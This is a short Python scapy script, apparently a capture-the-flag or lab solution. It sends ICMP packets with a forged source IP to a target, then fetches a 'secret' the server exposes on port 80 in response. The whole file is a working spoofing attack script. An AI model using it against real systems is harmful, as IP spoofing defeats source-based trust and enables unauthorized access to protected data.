from scapy.all import *
from sys import argv
import sys
import requests


def main():
    if len(argv) != 4:
        print("Usage: python3 spoof_ip.py <target_ip> <spoofed_ip> <payload_length>")
        sys.exit(1)

    target_ip = sys.argv[1]
    spoofed_ip = sys.argv[2]
    payload_len = int(sys.argv[3])

    print(f"Target IP: {target_ip}")
    print(f"Spoofed IP: {spoofed_ip}")
    print(f"Payload Length: {payload_len}")

    payload = b'!' * payload_len
    ip_layer = IP(src=spoofed_ip, dst=target_ip)
    icmp_layer = ICMP()

    # Create the packet
    packet = ip_layer / icmp_layer / payload

    print("[*] Packet Summary:")
    packet.show()

    # Send 2 packets
    send(packet, count=2, verbose=False)
    print("Spoofed packets sent.")

    # Wait for the server to open port 80
    print("Waiting for the server to open port 80...")
    time.sleep(1)

    secret_url = f"http://{target_ip}:80"

    try:
        print("Attempting to get the secret from the server...")
        r = requests.get(secret_url, timeout=5)

        # Check and print the secret if the request was successful
        if r.status_code == 200:
            print(f"Secret received:\n{r.text}")
        else:
            print(f"Unexpected HTTP status code: {r.status_code}")
    except Exception as e:
        print(f"Error getting secret: {e}")


if __name__ == "__main__":
    main()
